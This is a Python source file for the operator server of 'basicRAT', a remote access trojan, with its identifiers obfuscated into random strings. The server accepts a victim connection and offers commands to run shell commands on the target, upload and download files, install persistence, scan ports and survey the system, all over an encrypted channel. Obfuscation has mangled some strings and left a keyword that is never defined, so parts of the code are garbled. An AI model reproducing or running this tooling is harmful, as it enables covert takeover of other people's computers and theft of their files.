#!/usr/bin/env python
# -*- coding: utf-8 -*-
""" Basic RAT """
'''   test   '''
import argparse
import readline
import socket
import struct
import sys
import time
try:
    from core.crypto import CeouyyhuFLsWInUrJoBdWRYPlFgaiRak,ViGXFyDUMuRTyaLjdXDsFguYFLFKNZZW,zbQWsMLHGcxYPIPLqrCzJxVJZSwImrJS
    from core.filesock import yFFWnjJJUKgntESTvKXvkedPLbkUrxVc, PeNHllDzashAnbpvjTvghjdRoEWXqpjx
except ImportError as zOuzGTQsAwvmZlBzEZxbqQVWxtrOMBoL:
    print zOuzGTQsAwvmZlBzEZxbqQVWxtrOMBoL
    sys.exit(0)
zelkWjUtxajseZSrJOzioqiXvpuZDdwy = '''
download <files>    - Download file(s).
help                - Show this help menu.
persistence         - Apply persistence mechanism.
quit                - Gracefully kill client and server.
rekey               - Regenerate crypto key.
run <command>       - Execute a command on the target.
scan <ip>           - Scan top 25 ports on a single host.
survey              - Run a system survey.
unzip <file>        - Unzip a file.
upload <files>      - Upload files(s).
wget <url>          - Download a file from the web.
'''
XOvXKRiVWfwtDdehoYOdOiMeeOHIiehK = '''
______           _     ______  ___ _____   _            _
| ___ \         (_)    | ___ \/ _ \_   _| | |          | |
| |_/ / __ _ ___ _  ___| |_/ / /_\ \| |   | |_ ___  ___| |_
| ___ \/ _` / __| |/ __|    /|  _  || |   | __/ _ \/ __| __|
| |_/ / (_| \__ \ | (__| |\ \| | | || |   | ||  __/\__ \ |_
\____/ \__,_|___/_|\___\_| \_\_| |_/\_/    \__\___||___/\__|
'''
czuevaGFxgmKFHlQLQqSySOFWCmvpUPh = [ 'download', 'help', 'persistence', 'quit', 'rekey', 'run',
             'scan', 'survey', 'unzip', 'upload', 'wget' ]
def SkpvCRUEdgDHEXcNOsaOBBtYajdrcgyF():
    dDmLcEeyxVNrAXExGAoDNbiwAkpHNXhi = argparse.ArgumentParser(description='basicRAT server')
    dDmLcEeyxVNrAXExGAoDNbiwAkpHNXhi.add_argument('-p', '--port', help='Port to listen on.',
                        default=1337, type=int)
    return dDmLcEeyxVNrAXExGAoDNbiwAkpHNXhi
def PtbQMDTMHtVwKDzHngokYCTbHSbBQcRb():
    dDmLcEeyxVNrAXExGAoDNbiwAkpHNXhi  = SkpvCRUEdgDHEXcNOsaOBBtYajdrcgyF()
    IomZwqstaSKUJdvNQUMlmomDnlxFGlwl    = vars(dDmLcEeyxVNrAXExGAoDNbiwAkpHNXhi.parse_args())
    FBMUYmJGZoFsorBKEsmtrVmaOjpDpiBW    = IomZwqstaSKUJdvNQUMlmomDnlxFGlwl['port']
    orvpXeDFETMSCYwfmedlMJBYqHcHfHjH = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        orvpXeDFETMSCYwfmedlMJBYqHcHfHjH.bind(('0.0.0.0', FBMUYmJGZoFsorBKEsmtrVmaOjpDpiBW))
    except socket.error:
        print 'Error: Unable to start GwYoBHkHvFtleOwPqCJXtgCCCAdbNsXp, FBMUYmJGZoFsorBKEsmtrVmaOjpDpiBW {} in use?'.format(FBMUYmJGZoFsorBKEsmtrVmaOjpDpiBW)
        sys.exit(1)
    for pUggkpYIrLAAlOFDAAwmVxNmFsyrrBib in XOvXKRiVWfwtDdehoYOdOiMeeOHIiehK.split('\n'):
        time.sleep(0.05)
        print pUggkpYIrLAAlOFDAAwmVxNmFsyrrBib
    print 'basicRAT GwYoBHkHvFtleOwPqCJXtgCCCAdbNsXp listening on FBMUYmJGZoFsorBKEsmtrVmaOjpDpiBW {}...'.format(FBMUYmJGZoFsorBKEsmtrVmaOjpDpiBW)
    orvpXeDFETMSCYwfmedlMJBYqHcHfHjH.listen(10)
    omFIuRHOIxfAzEuxfgsDXQbVhXpuXZqa, GyspTpYrVmGCyThcGwaqYrbrkRatxYDx = orvpXeDFETMSCYwfmedlMJBYqHcHfHjH.accept()
    khfYFWQScZbMvoSzGticBVSoAlrbNKiD = zbQWsMLHGcxYPIPLqrCzJxVJZSwImrJS(omFIuRHOIxfAzEuxfgsDXQbVhXpuXZqa, GwYoBHkHvFtleOwPqCJXtgCCCAdbNsXp=True)
    while True:
        BxTlBLIjGVrvlWsuwwiRWHXbsGSBkXVZ = raw_input('\n[{}] basicRAT> '.format(GyspTpYrVmGCyThcGwaqYrbrkRatxYDx[0])).rstrip()
        if not BxTlBLIjGVrvlWsuwwiRWHXbsGSBkXVZ:
            continue
        mGCOWJvKRDKLqjjJcwhvjHGuUymwMYPL, _, UoqfdGVsPTrXcailIEcQirnRTZSydynI = BxTlBLIjGVrvlWsuwwiRWHXbsGSBkXVZ.partition(' ')
        if mGCOWJvKRDKLqjjJcwhvjHGuUymwMYPL not in czuevaGFxgmKFHlQLQqSySOFWCmvpUPh:
            print 'Invalid command, type "help" to see GduamyTzBjvOiokuYyEWvrsGJjWPLvFg list of commands.'
            continue
        if mGCOWJvKRDKLqjjJcwhvjHGuUymwMYPL == 'help':
            print zelkWjUtxajseZSrJOzioqiXvpuZDdwy
            continue
        omFIuRHOIxfAzEuxfgsDXQbVhXpuXZqa.send(ViGXFyDUMuRTyaLjdXDsFguYFLFKNZZW(BxTlBLIjGVrvlWsuwwiRWHXbsGSBkXVZ, khfYFWQScZbMvoSzGticBVSoAlrbNKiD))
        if mGCOWJvKRDKLqjjJcwhvjHGuUymwMYPL == 'quit':
            orvpXeDFETMSCYwfmedlMJBYqHcHfHjH.close()
            sys.exit(0)
        elif mGCOWJvKRDKLqjjJcwhvjHGuUymwMYPL == 'run':
            lnInZDlIzFbONJDRpyIFGSheTDobcoEm = omFIuRHOIxfAzEuxfgsDXQbVhXpuXZqa.recv(4096)
            print CeouyyhuFLsWInUrJoBdWRYPlFgaiRak(lnInZDlIzFbONJDRpyIFGSheTDobcoEm, khfYFWQScZbMvoSzGticBVSoAlrbNKiD).rstrip()
        elif mGCOWJvKRDKLqjjJcwhvjHGuUymwMYPL == 'download':
            for BDzMiZxfAEiNXaFLUqfMNVhImWqSMTSg in UoqfdGVsPTrXcailIEcQirnRTZSydynI.split():
                BDzMiZxfAEiNXaFLUqfMNVhImWqSMTSg = BDzMiZxfAEiNXaFLUqfMNVhImWqSMTSg.strip()
                yFFWnjJJUKgntESTvKXvkedPLbkUrxVc(omFIuRHOIxfAzEuxfgsDXQbVhXpuXZqa, BDzMiZxfAEiNXaFLUqfMNVhImWqSMTSg, khfYFWQScZbMvoSzGticBVSoAlrbNKiD)
        elif mGCOWJvKRDKLqjjJcwhvjHGuUymwMYPL == 'upload':
            for BDzMiZxfAEiNXaFLUqfMNVhImWqSMTSg in UoqfdGVsPTrXcailIEcQirnRTZSydynI.split():
                BDzMiZxfAEiNXaFLUqfMNVhImWqSMTSg = BDzMiZxfAEiNXaFLUqfMNVhImWqSMTSg.strip()
                PeNHllDzashAnbpvjTvghjdRoEWXqpjx(omFIuRHOIxfAzEuxfgsDXQbVhXpuXZqa, BDzMiZxfAEiNXaFLUqfMNVhImWqSMTSg, khfYFWQScZbMvoSzGticBVSoAlrbNKiD)
        elif mGCOWJvKRDKLqjjJcwhvjHGuUymwMYPL == 'rekey':
            khfYFWQScZbMvoSzGticBVSoAlrbNKiD = zbQWsMLHGcxYPIPLqrCzJxVJZSwImrJS(omFIuRHOIxfAzEuxfgsDXQbVhXpuXZqa, GwYoBHkHvFtleOwPqCJXtgCCCAdbNsXp=True)
        elif mGCOWJvKRDKLqjjJcwhvjHGuUymwMYPL in ['scan', 'survey', 'persistence', 'unzip', 'wget']:
            print 'Running {}...'.format(mGCOWJvKRDKLqjjJcwhvjHGuUymwMYPL)
            lnInZDlIzFbONJDRpyIFGSheTDobcoEm = omFIuRHOIxfAzEuxfgsDXQbVhXpuXZqa.recv(1024)
            print CeouyyhuFLsWInUrJoBdWRYPlFgaiRak(lnInZDlIzFbONJDRpyIFGSheTDobcoEm, khfYFWQScZbMvoSzGticBVSoAlrbNKiD)
if __name__ == '__main__':
    PtbQMDTMHtVwKDzHngokYCTbHSbBQcRb()
